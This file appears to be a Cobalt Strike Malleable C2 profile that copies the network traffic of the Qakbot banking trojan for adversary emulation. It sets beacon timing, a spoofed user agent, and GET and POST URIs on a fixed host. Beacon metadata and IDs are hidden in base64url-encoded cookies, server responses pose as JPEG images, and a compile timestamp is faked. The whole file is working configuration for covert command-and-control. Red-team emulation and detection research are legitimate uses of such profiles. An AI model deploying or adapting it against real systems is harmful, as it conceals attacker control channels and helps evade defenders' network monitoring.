#qakbot - the return of qakbot!
#https://www.cylance.com/en_us/blog/threat-spotlight-the-return-of-qakbot-malware.html
#https://securityintelligence.com/qakbot-banking-trojan-causes-massive-active-directory-lockouts/
#xx0hcd


set sleeptime "30000";
set jitter    "20";
set useragent "Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)";
set dns_idle "8.8.8.8";
set maxdns    "235";


http-get {

    set uri "/TealeafTarget.php";
    
    client {

	header "Connection" "Keep-Alive";
	header "Accept" "*/*";
	header "Accept-Language" "en-us";
	#header "Cookie" "47952628-ffb7-43db-b880-d727751";        
	header "Host" "projects.montgomerytech.com";
        
        
        metadata {
            base64url;
            header "Cookie";


        }

    }

    server {

	header "Server" "nginx/1.12.0";
        header "Date" "Thu, 04 May 2017 19:01:45 GMT";
        header "Content-Type" "image/jpeg; charset=ISO-8859-1";
	header "Content-Length" "925776";        
	header "Connection" "keep-alive";
        

        output {
            netbios;
            print;
        }
    }
}

http-post {
    
    set uri "/TeaLeafTarget.php";
    #set verb "GET";

    client {

        header "Connection" "Keep-Alive";
	header "Accept" "*/*";
	header "Accept-Language" "en-us";        
	header "Host" "projects.montgomerytech.com";
        
        output {
            netbios;
	    print;


        }
        
        
        id {
            base64url;
	    prepend "479526mGJ8-";
	    header "Cookie";


        }
    }

    server {

	header "Server" "nginx/1.12.0";
        header "Date" "Thu, 04 May 2017 19:01:45 GMT";
        header "Content-Type" "image/jpeg; charset=ISO-8859-1";
	header "Content-Length" "925776";        
	header "Connection" "keep-alive";
        

        output {
            base64;
            print;
        }
    }
}

http-stager {
    server {
        header "Server" "nginx/1.12.0";
        header "Date" "Thu, 04 May 2017 19:01:45 GMT";
        header "Content-Type" "image/jpeg; charset=ISO-8859-1";
	header "Content-Length" "925776";        
	header "Connection" "keep-alive";
    
    }


}
stage {
	set compile_time "14 Jun 2016 11:56:42";
	set userwx "false";
	set image_size_x86 "458752";
}
